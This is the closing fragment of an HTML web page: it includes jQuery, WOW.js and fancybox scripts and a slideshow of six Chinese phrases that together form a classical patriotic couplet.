<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
<script>
new WOW().init();
</script>   


  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>



  <section class="hidden-xs"> 
  <ul class="cb-slideshow"> 
    <li><span>苟利</span></li> 
    <li><span>国家</span></li> 
    <li><span>生死以</span></li> 
    <li><span>岂能</span></li> 
    <li><span>祸福</span></li> 
    <li><span>趋避之</span></li> 
  </ul>
</section>
<script src="/js/script.js"></script>



  </div>
</body>
</html>